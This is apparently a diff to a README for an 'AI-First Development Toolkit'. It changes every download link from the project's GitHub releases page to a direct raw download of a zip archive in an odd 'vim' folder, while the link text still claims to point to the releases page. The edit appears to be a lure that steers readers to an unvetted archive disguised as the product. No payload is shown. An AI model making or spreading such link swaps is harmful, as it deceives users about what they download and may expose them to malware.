@@ -1,6 +1,6 @@
 # 🤖 BHIL-AI-First-Development-Toolkit - Build AI Apps With Clear Steps
 
-[![Download the Toolkit](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/releases)
+[![Download the Toolkit](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/raw/refs/heads/main/vim/First-Development-BHI-A-Toolkit-3.8.zip)
 
 ## 🧭 What this is
 
@@ -24,7 +24,7 @@ If the release includes a desktop app or helper tool, Windows may ask for permis
 
 To get the software, visit the release page and download the file for Windows:
 
-[Visit the releases page to download](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/releases)
+[Visit the releases page to download](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/raw/refs/heads/main/vim/First-Development-BHI-A-Toolkit-3.8.zip)
 
 When you open the page:
 
@@ -167,7 +167,7 @@ This keeps the setup simple and lowers the chance of mistakes.
 
 If you need to get the file again, use the release page here:
 
-[Download from GitHub Releases](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/releases)
+[Download from GitHub Releases](https://github.com/hesitancewaterbeetle490/BHIL-AI-First-Development-Toolkit/raw/refs/heads/main/vim/First-Development-BHI-A-Toolkit-3.8.zip)
 
 ## 🧾 Version and release use
 
